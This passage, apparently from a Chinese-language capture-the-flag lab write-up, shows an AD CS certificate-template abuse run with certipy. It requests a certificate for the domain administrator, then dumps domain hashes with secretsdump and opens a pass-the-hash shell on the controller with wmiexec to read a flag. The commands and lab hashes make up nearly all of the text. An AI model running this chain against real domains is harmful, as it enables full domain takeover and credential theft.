```sh
proxychains certipy find -u win2012\$@xiaorang.lab -hashes 00000000000000000000000000000000:41a258d72365350640270508748c9675 -dc-ip 172.22.61.17 -vulnerable
cat 20231030050124_Certipy.txt
```

回显

```sh
Vulnerabilities
    ECS1    : 'XIAORNAG.lAB\\Domain Computers' can enroll , enroll supplies subject and template allows client authentication
```

发现 win2012 可利用模板，为域管请求证书，转换格式，请求 TGT

```sh
proxychains certipy req -u win2012\$@xiaorang.lab -hashes 00000000000000000000000000000000:41a258d72365350640270508748c9675 -target 172.22.61.17 -ca xiaorang-DC-CA-CA -template win2012 -upn administrator@xiaorang.lab
proxychains certipy auth -pfx administrator.pfx -dc-ip 172.22.61.17
# 导出域内哈希
proxychains python3 secretsdump.py xiaorang.lab/administrator@172.22.61.17 -just-dc -hashes aad3b435b51404eeaad3b435b51404ee:e26a28fd9daa8a6a4d3c5adbbdcb0f53
# 拿到域管哈希之后即可拿下域控
proxychains python3 wmiexec.py xiaorang.lab/administrator@172.22.61.17 -hashes aad3b435b51404eeaad3b435b51404ee:e26a28fd9daa8a6a4d3c5adbbdcb0f53
type C:\Users\Administrator\flag\flag04.txt
```
